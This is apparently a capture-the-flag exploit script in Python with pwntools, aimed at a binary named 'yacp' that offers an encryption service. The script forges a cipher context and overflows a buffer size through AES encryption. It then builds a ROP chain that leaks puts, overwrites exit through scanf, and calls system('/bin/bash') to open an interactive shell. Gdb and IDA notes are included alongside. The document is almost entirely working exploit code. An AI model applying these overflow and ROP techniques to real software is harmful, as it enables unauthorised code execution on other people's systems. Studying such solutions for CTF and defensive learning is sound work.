from pwn import *
import binascii
import sys
import hashlib
import random
import time
import subprocess

def rl(l):
    z = ''
    while len(z) < l:
        z += random.choice("ABCDEFabcdef0123456789")

    return z

def writedata( r, block, data):
    r.send('0\n')
    print r.readline()
    r.send(str(len(data)) + '\n')
    print r.readline()
    r.send(str(block) + '\n')
    print r.readline()

    r.send(binascii.hexlify(data))
    print r.readuntil('ay data\n')

def encdata( r, iv_block, key_block, data_block, out_block):
    r.send('3\n')
    print r.readline()
    r.sendline('aes-256-cbc')
    print r.readline()
    r.sendline(str(data_block))
    print r.readline()
    r.sendline(str(out_block))
    print r.readline()
    r.sendline(str(key_block))
    print r.readline()
    r.sendline(str(iv_block))
    print r.readuntil('ay data\n')

def decdata( r, iv_block, key_block, enc_block, out_block):
    r.send('4\n')
    print r.readline()
    r.sendline('aes-256-cbc')
    print r.readline()
    r.sendline(str(enc_block))
    print r.readline()
    r.sendline(str(out_block))
    print r.readline()
    r.sendline(str(key_block))
    print r.readline()
    r.sendline(str(iv_block))

def handle_pow(r):
    y = r.readuntil('word? ')
    z = y.split('\n')
    w = z[3].split(' ')[3]
    
    print len(w)
    print w

    print 'Calling proof of work'
    subprocess.call(["./pow", w])
    print 'POW finished'

    f = open('plain.txt', 'rb')
    d = f.read()
    f.close()
    if len(d) != 32:
        print '[ERROR] Length is not 32'
        r.close()
        sys.exit(1)

    r.send(d)
    print r.readline()

key = "\x7d\xda\x9e\xcc\x55\x31\x0e\x1a\x0a\xdd\x1e\x91\x5f\x6f\xcf\xdb\xe5\x65\x34\x45\x49\x33\x5b\x81\xab\xc4\xcc\x09\x3b\x59\x5e\xed"

#r = process(executable='./yacp', argv=['./yacp', 'b'], env={'LD_PRELOAD': './libc.so.6:./libcrypto.so.1.0.0'})
r = remote( 'localhost', 6666)

handle_pow(r)

## Write the data
print r.readuntil('ay data\n')
writedata( r, 30, 'A'*2048)

## write the key
writedata( r, 29, key)

## write the fake cipher context
cxt = 'a'*0x12
cxt += '\x10'
cxt += 'bbbbb'
cxt += p32(0x08048C75)   ## this becomes the first pc. It is a leave; ret
writedata( r, 0, cxt)
cxt_addr = p32(0x804C0E0)

## write a %u to be used by scanf later
writedata( r, 1, "%u")

## write /bin/bash for the command to system
writedata( r, 10, "/bin/bash")

## write the data to be encrypted for the later overflow
writedata( r, 3, 'b'*2048)

ovr = 'c'*0x98
ovr += cxt_addr
ovr += 'e'*(2048-len(ovr))
writedata( r, 4, ovr)

## Get the overflow of the size. This will set the size of 3 to 0xc22
encdata( r, 2, 29, 30, 31)

rop = 'eeee'   ## becomes ebp
rop += p32(0x08048960)   #first rop pc. Address for puts
rop += p32(0x08049126)   # pop; pop; ret
rop += p32(0x0804C034)   ## pointer to the data to leak (puts)
rop += p32(0xcafebabe)
rop += p32(0x08048A30)   ## scanf
rop += p32(0x08049126)  ## pop; pop; ret
rop += p32(0x0804c8e0)  ## address of %u
rop += p32(0x0804C040)  ## address of exit
rop += p32(0x08048990)  ## exit call but it is overwritten by now
rop += p32(0xdeadbeef)
rop += p32(0x080510e0)  ## address of /bin/bash 
rop += 'f'*(2048-len(rop))

writedata( r, 2, rop)
encdata( r, 2, 29, 3, 5)

raw_input('...')

## This will trigger the overflow and cause a segfault
'''
Program received signal SIGSEGV, Segmentation fault.
0xb741ff74 in EVP_EncryptFinal_ex () from ./libcrypto.so.1.0.0
(gdb) x /i $pc
=> 0xb741ff74 <EVP_EncryptFinal_ex+20>: testb  $0x10,0x12(%eax)

From IDA:
.text:000BDF74                 test    byte ptr [eax+12h], 10h
.text:000BDF78                 jnz     short loc_BDFF0
...
.text:000BDFF0                 push    0
.text:000BDFF2                 push    0
.text:000BDFF4                 push    [esp+14h+arg_4]
.text:000BDFF8                 push    edi
.text:000BDFF9                 call    dword ptr [eax+18h]
'''
decdata( r, 2, 29, 5, 31)

y = r.readline()

if len(y) < 4:
    print '[ERROR] Did not leak enough.'
    r.close()
    sys.exit(1)

puts = u32(y[:4])
system = puts - 0x24f00

print 'system(): 0x%x' %(system)
r.sendline(str(system))

r.interactive()
'''
State at pc control'
eax            0x804c0e0    134529248    <== address of ctx structure (controlled)
ecx            0xbfe08ccc   -1075802932
edx            0x805c510    134595856
ebx            0xb756a000   -1219059712
esp            0xbfe08c5c   0xbfe08c5c
ebp            0x804d0e0    0x804d0e0 <= ptr to IV
esi            0x805c510    134595856
edi            0x805c178    134594936
eip            0x7a7a7a7a   0x7a7a7a7a
'''

'''
stack at pc control
(gdb) x /20x $esp
0xbfe08c5c: 0xb7445ffc  0x0805c178  0x0805c510  0x00000000
0xbfe08c6c: 0x00000000  0xb756a000  0x0805c510  0x0804e8e0
0xbfe08c7c: 0xb74464f3  0x0805c178  0x0805c510  0xbfe08ccc
0xbfe08c8c: 0x0000001f  0x0805b8e0 <== ptr to data
'''

'''
gadget
.text:08048C75                 leave
.text:08048C76                 retn
'''

'''
Leak a pointer with puts
.plt:08048960 _puts           proc near               ; CODE XREF: main+30p
.plt:08048960                                         ; main+3Cp ...
.plt:08048960                 jmp     ds:off_804C034
.plt:08048960 _puts           endp
'''

'''
I can use scanf to write a value somewhere
.text:08048B24                 mov     [esp+4], ebx
.text:08048B28                 mov     dword ptr [esp], offset aD ; "%d"
.text:08048B2F                 call    ___isoc99_scanf

.plt:08048A30 ___isoc99_scanf proc near               ; CODE XREF: main+AFp
.plt:08048A30                                         ; getBufferID+1Ep ...
.plt:08048A30                 jmp     ds:off_804C068
.plt:08048A30 ___isoc99_scanf endp
'''
## encrypt data to overflow the size
## block 3 should be 3016

r.close()